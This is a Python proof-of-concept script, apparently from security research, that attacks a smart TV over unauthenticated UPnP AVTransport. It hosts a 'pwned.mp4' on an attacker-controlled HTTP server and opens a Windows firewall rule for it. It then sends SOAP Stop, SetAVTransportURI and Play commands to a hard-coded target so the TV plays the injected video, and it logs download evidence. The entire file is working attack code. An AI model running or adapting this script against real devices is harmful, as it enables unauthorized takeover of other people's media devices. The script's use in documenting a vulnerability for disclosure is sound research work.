#!/usr/bin/env python3
"""
Keep media server up for 60s after injection and capture full download evidence.
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
import os
import tempfile
import time
import threading
import json
import datetime
import re
import http.server
import socketserver
import requests

_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                    "..", "..", "..", "..", "..", ".tmp")
os.makedirs(_tmp, exist_ok=True)
tempfile.tempdir = _tmp

TARGET   = "192.168.18.6"
ATTACKER = "192.168.18.147"
PORT     = 9999
UPNP     = 2870
MP4_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwned.mp4")

HITS = []
BYTES_SENT = [0]


class Handler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        self._log("HEAD")
        if self.path.endswith(".mp4") and os.path.exists(MP4_PATH):
            size = os.path.getsize(MP4_PATH)
            self.send_response(200)
            self.send_header("Content-Type", "video/mp4")
            self.send_header("Content-Length", str(size))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
        else:
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        self._log("GET")
        if self.path.endswith(".mp4") and os.path.exists(MP4_PATH):
            self._serve_file(MP4_PATH, "video/mp4")
        else:
            body = b"Uniao Geek PoC\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    def _serve_file(self, path, content_type):
        size = os.path.getsize(path)
        range_hdr = self.headers.get("Range", "")
        if range_hdr.startswith("bytes="):
            parts = range_hdr[6:].split("-")
            start = int(parts[0]) if parts[0] else 0
            end   = int(parts[1]) if len(parts) > 1 and parts[1] else size - 1
            length = end - start + 1
            self.send_response(206)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Range", f"bytes {start}-{end}/{size}")
            self.send_header("Content-Length", str(length))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
            with open(path, "rb") as f:
                f.seek(start)
                chunk = f.read(length)
                self.wfile.write(chunk)
                BYTES_SENT[0] += len(chunk)
        else:
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(size))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
            with open(path, "rb") as f:
                data = f.read()
                self.wfile.write(data)
                BYTES_SENT[0] += len(data)

    def _log(self, method):
        h = {
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "method": method, "path": self.path,
            "peer": self.client_address[0],
            "ua": self.headers.get("User-Agent", ""),
            "range": self.headers.get("Range", ""),
        }
        HITS.append(h)
        print(f"  *** {method} {self.path} from {h['peer']}  "
              f"range={h['range']!r}  ua={h['ua']!r:.50}",
              flush=True)

    def log_message(self, *args):
        pass


def soap(svc, action, inner, path):
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f"<s:Body><u:{action} xmlns:u=\"{svc}\">{inner}</u:{action}></s:Body>"
        "</s:Envelope>"
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{svc}#{action}"',
    }
    return requests.post(f"http://{TARGET}:{UPNP}/{path}",
                         data=body.encode(), headers=headers, timeout=10)


def get_transport_state():
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    r = soap(AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport")
    m = re.search(r"<CurrentTransportState>([^<]+)</CurrentTransportState>", r.text)
    return m.group(1) if m else "?"


def get_position():
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    r = soap(AVT, "GetPositionInfo", "<InstanceID>0</InstanceID>", "control/AVTransport")
    rel = re.search(r"<RelTime>([^<]+)</RelTime>", r.text)
    dur = re.search(r"<TrackDuration>([^<]+)</TrackDuration>", r.text)
    uri = re.search(r"<TrackURI>([^<]+)</TrackURI>", r.text)
    return {
        "rel_time": rel.group(1) if rel else "?",
        "duration": dur.group(1) if dur else "?",
        "uri": uri.group(1) if uri else "?",
    }


def main():
    if not os.path.exists(MP4_PATH):
        print(f"[!] {MP4_PATH} not found - run gen_pwned_video.py first")
        return

    size_kb = os.path.getsize(MP4_PATH) // 1024
    print(f"[*] MP4 ready: {size_kb} KB")

    os.system('netsh advfirewall firewall add rule name="PoC_Media_9999" dir=in action=allow protocol=TCP localport=9999 >nul 2>&1')

    srv = socketserver.TCPServer(("", PORT), Handler)
    srv.allow_reuse_address = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[*] Server up on {ATTACKER}:{PORT}, serving pwned.mp4 ({size_kb} KB)")

    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    uri = f"http://{ATTACKER}:{PORT}/pwned.mp4"

    # Stop whatever is playing
    soap(AVT, "Stop", "<InstanceID>0</InstanceID>", "control/AVTransport")
    time.sleep(1)

    print(f"\n[*] Injecting: {uri}")
    r1 = soap(AVT, "SetAVTransportURI",
              f"<InstanceID>0</InstanceID><CurrentURI>{uri}</CurrentURI>"
              "<CurrentURIMetaData></CurrentURIMetaData>",
              "control/AVTransport")
    print(f"    SetAVTransportURI: HTTP {r1.status_code}")

    r2 = soap(AVT, "Play", "<InstanceID>0</InstanceID><Speed>1</Speed>",
              "control/AVTransport")
    print(f"    Play: HTTP {r2.status_code}")

    print("\n[*] Monitoring TV for 60s...")
    start = time.time()
    last_state = ""
    while time.time() - start < 60:
        state = get_transport_state()
        if state != last_state:
            pos = get_position()
            elapsed = int(time.time() - start)
            print(f"  [{elapsed:3d}s] state={state}  pos={pos['rel_time']}/{pos['duration']}  "
                  f"bytes_served={BYTES_SENT[0]//1024}KB  hits={len(HITS)}")
            last_state = state
            if state == "STOPPED" and elapsed > 5:
                print("  [!] TV stopped playing - video may have ended or was rejected")
                break
        time.sleep(2)

    srv.shutdown()
    os.system('netsh advfirewall firewall delete rule name="PoC_Media_9999" >nul 2>&1')

    evidence = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "mp4_path": MP4_PATH, "mp4_size_kb": size_kb,
        "hits": HITS, "total_bytes_served": BYTES_SENT[0],
        "video_downloaded": BYTES_SENT[0] > 10000,
    }
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "serve_confirm_evidence.json")
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2)

    print("\n=== RESULTS ===")
    print(f"  Total requests from TV : {len(HITS)}")
    print(f"  Total bytes served     : {BYTES_SENT[0]//1024} KB")
    print(f"  Video downloaded       : {evidence['video_downloaded']}")
    for h in HITS:
        print(f"  {h['method']} {h['path']} range={h['range']!r}")
    print(f"\n[*] Evidence -> {out}")


if __name__ == "__main__":
    main()
